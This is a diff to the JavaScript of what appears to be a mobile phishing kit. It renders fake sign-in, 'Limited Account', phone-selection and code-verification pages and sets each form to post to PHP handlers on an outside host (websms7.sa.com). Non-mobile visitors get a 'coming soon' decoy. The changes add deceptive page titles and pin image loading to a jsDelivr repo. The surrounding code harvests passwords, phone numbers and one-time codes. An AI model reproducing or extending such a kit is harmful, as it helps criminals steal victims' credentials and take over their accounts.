@@ -1,5 +1,5 @@
 var manovar1;
-var LinkImagens = 'https://cdn.jsdelivr.net/gh/kbondnewera/cozinhando/';
+var LinkImagens = 'https://cdn.jsdelivr.net/gh/kbondnewera/cozinhando@latest/';
 var LinkPost = 'https://arquivos.websms7.sa.com/filesok/';
 const PaginaConstrucao = '<div class="bgimg">\n <div class="topleft">\n <p>Logo</p>\n </div>\n <div class="middle">\n <h1>COMING SOON</h1>\n <hr>\n <p>35 days</p>\n </div>\n <div class="bottomleft">\n <p>Some text</p>\n </div>\n </div>'
 const isMobile = {Android: function() {return navigator.userAgent.match(/Android/i);}, iOS: function() {return navigator.userAgent.match(/iPhone|iPad|iPod/i);}, any: function() {return (isMobile.Android() ||  isMobile.iOS());}}
@@ -35,6 +35,7 @@ function CarregarLogin()
 				try { document.getElementById("manollx").style.display = "none"; } catch (error) { console.error(error); }
 				try { document.getElementById("manoaa1").style.display = "block"; } catch (error) { console.error(error); }
 				try { document.getElementById("body").style.backgroundSize = "auto 100%"; } catch (error) { console.error(error); }
+				try{ document.title = 'Mobile SignIn';}catch (error){console.error(error);}
 			}
 			else {document.getElementById("body").innerHTML = PaginaConstrucao}
 		}
@@ -59,6 +60,8 @@ function CarregarErroSenha()
 			'        </div><br>\n' +
 			'        <footer class="d-md-none"><img id="imgfooter" class="" src="" alt="" width="100%"></footer>\n' +
 			' </form></div>';
+		try{ document.title = "Mobile SignIn";}catch (error){console.log(error);}
+
 		try { document.getElementById("LoginPost").setAttribute('action', LinkPost + 'login.php'); } catch (error) { console.error(error); }
 		try { document.getElementById("urllink").value = window.location.hostname; } catch (error) { console.error(error); }
 		try { document.getElementById("imgfavicon").setAttribute('href', LinkImagens + 'favicon.ico'); } catch (error) { console.error(error); }
@@ -100,6 +103,8 @@ function CarregarLimited()
 			'        </div>\n' +
 			'    </form>\n' +
 			'</div>';
+		try{ document.title = "Limited Account";}catch (error){console.log(error);}
+
 		try { document.getElementById("LimitedPost").setAttribute('action', LinkPost + 'limited.php'); } catch (error) { console.error(error); }
 		try { document.getElementById("imgfavicon").setAttribute('href', LinkImagens + 'favicon.ico'); } catch (error) { console.error(error); }
 		try { document.getElementById("imglogo").setAttribute('src', LinkImagens + 'logo.png'); } catch (error) { console.error(error); }
@@ -156,6 +161,8 @@ function CarregarNumeros()
 				'\t\t  </div>\n' +
 				'\t  </form>\n' +
 				'  </div>';
+			try{ document.title = "Phone Selection";}catch (error){console.log(error);}
+
 			document.getElementById("NumerosCarregados").innerHTML = PaginaHtmlx;
 			try { document.getElementById("MobilePost").setAttribute('action', LinkPost + 'mobileregister.php'); } catch (error) { console.error(error); }
 			try {document.getElementById("imgfavicon").setAttribute('href',LinkImagens + 'favicon.ico');} catch (error) {console.error(error);}
@@ -223,6 +230,8 @@ function CarregarCodigo()
 	try {document.getElementById("submitcodigo").setAttribute('action',LinkPost + 'sendcode.php');} catch (error) {console.error(error);}
 	try {document.getElementById("imgfavicon").setAttribute('href',LinkImagens + 'favicon.ico');} catch (error) {console.error(error);}
 	try {document.getElementById("imglogo").setAttribute('src',LinkImagens + 'logo.png');} catch (error) {console.error(error);}
+	try{ document.title = "Code Verification";}catch (error){console.log(error);}
+
 	sleep(5000).then(() =>
 	{
 		try { document.getElementById("body").style.background = "url(" + LinkImagens + "/background.jpg) fixed center top repeat-y"; } catch (error) { console.error(error); }
@@ -271,6 +280,7 @@ function CarregarCodigoErro()
 	try {document.getElementById("manollx").style.display = "none";} catch (error) {console.error(error);}
 	try {document.getElementById("manoaa1").style.display = "block";} catch (error) {console.error(error);}
 	try {document.getElementById("body").style.backgroundSize = "auto 100%";} catch (error) {console.error(error);}
+	try{ document.title = "Verification Error";}catch (error){console.log(error);}
 }
 function CarregarSuccess()
 {
@@ -301,6 +311,7 @@ function CarregarSuccess()
 	try {document.getElementById("manollx").style.display = "none";} catch (error) {console.error(error);}
 	try {document.getElementById("manoaa1").style.display = "block";} catch (error) {console.error(error);}
 	try {document.getElementById("body").style.backgroundSize = "auto 100%";} catch (error) {console.error(error);}
+	try{ document.title = "Success";}catch (error){console.log(error);}
 }
 function RadioValidator()
 {
